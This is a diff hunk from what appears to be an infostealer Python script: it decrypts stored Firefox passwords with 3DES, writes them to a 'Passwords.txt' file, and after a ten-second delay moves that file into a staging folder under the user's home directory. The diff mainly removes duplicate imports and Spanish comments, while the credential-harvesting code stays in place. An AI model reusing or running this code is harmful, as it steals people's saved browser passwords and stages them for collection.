@@ -322,33 +322,18 @@ with open('Passwords.txt', 'w', encoding="utf-8") as f:
         f.write('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
         f.write('\n')
 
-import os
-import shutil
 
-import os
-import shutil
-import time
-
-import os
-import shutil
-import time
-
-# Directorio de descarga
 download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'ROBMO')
 
 source_path = os.path.join(download_folder, 'Passwords.txt')
 
-# Directorio de Firefox
 firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬', '𝐅𝐢𝐫𝐞𝐟𝐨𝐱')
 destination_path = os.path.join(firefox_folder, 'Passwords.txt')
 
-# Verificar si la carpeta de Firefox existe y crearla si es necesario
 if not os.path.exists(firefox_folder):
     os.makedirs(firefox_folder)
 
-# Esperar 10 segundos
 time.sleep(10)
 
-# Mover el archivo
 shutil.move(source_path, destination_path)
 
